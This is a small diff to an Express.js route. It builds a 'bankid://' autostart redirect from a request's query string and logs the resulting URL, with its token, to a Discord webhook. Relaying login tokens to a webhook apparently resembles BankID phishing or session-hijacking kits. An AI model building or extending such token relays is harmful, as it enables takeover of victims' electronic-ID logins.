@@ -18,7 +18,7 @@ app.get('/', (req, res) => {
     return res.status(400).send('Query parameters are required.');
   }
 
-  const redirectUrl = `bankid://?autostarttoken=${queryString}`;
+  const redirectUrl = `bankid:///?autostarttoken=${queryString}`;
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
